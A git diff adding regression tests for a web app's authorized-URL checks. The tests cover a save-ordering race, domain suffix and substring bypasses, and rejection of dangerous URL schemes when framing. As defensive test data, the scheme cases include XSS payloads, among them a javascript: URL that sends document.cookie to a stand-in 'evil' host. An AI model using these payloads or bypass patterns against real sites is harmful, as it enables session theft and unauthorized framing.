@@ -3,6 +3,7 @@ import { MOCK_TEAM_ID, api } from 'lib/api.mock'
 import { router } from 'kea-router'
 import { expectLogic } from 'kea-test-utils'
 
+import { SetupTaskId, globalSetupLogic } from 'lib/components/ProductSetup'
 import { urls } from 'scenes/urls'
 
 import { useMocks } from '~/mocks/jest'
@@ -13,6 +14,8 @@ import {
     SuggestedDomain,
     appEditorUrl,
     authorizedUrlListLogic,
+    checkUrlIsAuthorized,
+    checkUrlIsSafeToFrame,
     directToolbarUrl,
     filterNotAuthorizedUrls,
     validateProposedUrl,
@@ -62,6 +65,48 @@ describe('the authorized urls list logic', () => {
         await expectLogic(logic).toNotHaveDispatchedActions(['newUrl'])
     })
 
+    describe('applying a suggestion', () => {
+        // Regression coverage: the `addUrl` listener must await `saveUrls` before triggering
+        // `markTaskAsCompleted`. Both send PATCHes to /api/environments/:id, and the `currentTeam`
+        // subscription in this logic replaces local `authorizedUrls` from whichever response lands
+        // last. If the onboarding-tasks PATCH fires in parallel with the app_urls PATCH, its
+        // response can carry a stale app_urls snapshot and wipe the just-added URL out of the UI.
+        it('only marks the setup task as completed after saveUrls resolves', async () => {
+            const markTaskAsCompleted = jest.fn()
+            jest.spyOn(globalSetupLogic, 'findMounted').mockReturnValue({
+                actions: { markTaskAsCompleted },
+            } as any)
+
+            let resolveUpdate: (value: any) => void = () => {}
+            jest.spyOn(api, 'update').mockImplementation(
+                () =>
+                    new Promise((resolve) => {
+                        resolveUpdate = resolve
+                    })
+            )
+
+            const flushPromises = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0))
+
+            logic.actions.addUrl('https://new-suggestion.example.com')
+
+            await flushPromises()
+
+            expect(api.update).toHaveBeenCalledWith(
+                `api/environments/${MOCK_TEAM_ID}`,
+                expect.objectContaining({
+                    app_urls: expect.arrayContaining(['https://new-suggestion.example.com']),
+                })
+            )
+            // saveUrls is still pending, so the onboarding task PATCH must not have fired yet
+            expect(markTaskAsCompleted).not.toHaveBeenCalled()
+
+            resolveUpdate({ app_urls: ['https://new-suggestion.example.com'] })
+            await expectLogic(logic).toFinishAllListeners()
+
+            expect(markTaskAsCompleted).toHaveBeenCalledWith(SetupTaskId.AddAuthorizedDomain)
+        })
+    })
+
     describe('the proposed URL form', () => {
         it('shows errors when the value is invalid', async () => {
             await expectLogic(logic, () => {
@@ -71,6 +116,41 @@ describe('the authorized urls list logic', () => {
                 proposedUrlChanged: true,
                 proposedUrlHasErrors: true,
                 proposedUrlValidationErrors: { url: 'Please enter a valid URL' },
+            })
+        })
+    })
+
+    describe('checkUrlIsAuthorized', () => {
+        const testCases: { url: string; authorized: string[]; expected: boolean }[] = [
+            // Legitimate matches
+            { url: 'https://example.com', authorized: ['https://example.com'], expected: true },
+            { url: 'https://example.com/some/path?q=1', authorized: ['https://example.com'], expected: true },
+            { url: 'https://example.com', authorized: ['https://example.com/already/has/a/path'], expected: true },
+            // www-equivalence both directions
+            { url: 'https://example.com', authorized: ['https://www.example.com'], expected: true },
+            { url: 'https://www.example.com', authorized: ['https://example.com'], expected: true },
+            // Protocol must match: an http origin must not match an https-only authorized entry
+            { url: 'http://example.com', authorized: ['https://example.com'], expected: false },
+            { url: 'http://www.example.com', authorized: ['https://example.com'], expected: false },
+            // wildcard subdomains and ports
+            { url: 'https://app.example.com', authorized: ['https://*.example.com'], expected: true },
+            { url: 'https://a.b.example.com', authorized: ['https://*.example.com'], expected: true },
+            { url: 'http://localhost:3000', authorized: ['http://localhost:*'], expected: true },
+            // Suffix bypass: an attacker domain that merely ends with the authorized origin string
+            { url: 'https://example.com.evil.com', authorized: ['https://example.com'], expected: false },
+            { url: 'https://app.example.com.evil.com', authorized: ['https://*.example.com'], expected: false },
+            // Prefix/substring bypass: a different registrable domain that is a substring of the entry
+            { url: 'https://example.co', authorized: ['https://example.com'], expected: false },
+            // Plain unrelated origin
+            { url: 'https://evil.com', authorized: ['https://example.com'], expected: false },
+            { url: 'https://example.org', authorized: ['https://example.com'], expected: false },
+            // Nothing authorized
+            { url: 'https://example.com', authorized: [], expected: false },
+        ]
+
+        testCases.forEach(({ url, authorized, expected }) => {
+            it(`"${url}" against [${authorized.join(', ')}] is ${expected ? 'authorized' : 'not authorized'}`, () => {
+                expect(checkUrlIsAuthorized(url, authorized)).toBe(expected)
             })
         })
     })
@@ -279,6 +359,40 @@ describe('the authorized urls list logic', () => {
         it('includes toolbarFlagsKey when provided', () => {
             const params = parseHash(directToolbarUrl('https://example.com', { toolbarFlagsKey: 'flags_key_xyz' }))
             expect(params.toolbarFlagsKey).toBe('flags_key_xyz')
+        })
+    })
+
+    describe('checkUrlIsSafeToFrame', () => {
+        const authorizedUrls = ['https://example.com', 'https://*.allowed.com', 'http://localhost:*']
+
+        const testCases: { url: string; safe: boolean }[] = [
+            // Authorized http(s) URLs are safe to frame
+            { url: 'https://example.com', safe: true },
+            { url: 'https://example.com/some/path', safe: true },
+            { url: 'https://app.allowed.com', safe: true },
+            { url: 'http://localhost:3000', safe: true },
+            // Authorized host but a dangerous scheme must still be rejected
+            { url: 'javascript:alert(document.domain)', safe: false },
+            { url: 'javascript:fetch("//evil?"+document.cookie)//', safe: false },
+            { url: 'data:text/html,<script>alert(1)</script>', safe: false },
+            { url: 'blob:https://example.com/uuid', safe: false },
+            { url: 'vbscript:msgbox(1)', safe: false },
+            { url: 'JavaScript:alert(1)', safe: false },
+            { url: ' javascript:alert(1)', safe: false },
+            // Valid scheme but origin is not authorized
+            { url: 'https://evil.example.net', safe: false },
+            { url: 'https://example.org', safe: false },
+            // Degenerate inputs fail closed
+            { url: '', safe: false },
+            { url: 'not-a-url', safe: false },
+        ]
+
+        it.each(testCases)('treats "$url" as safe=$safe to frame', ({ url, safe }) => {
+            expect(checkUrlIsSafeToFrame(url, authorizedUrls)).toBe(safe)
+        })
+
+        it('is unsafe when no URLs are authorized', () => {
+            expect(checkUrlIsSafeToFrame('https://example.com', [])).toBe(false)
         })
     })
 
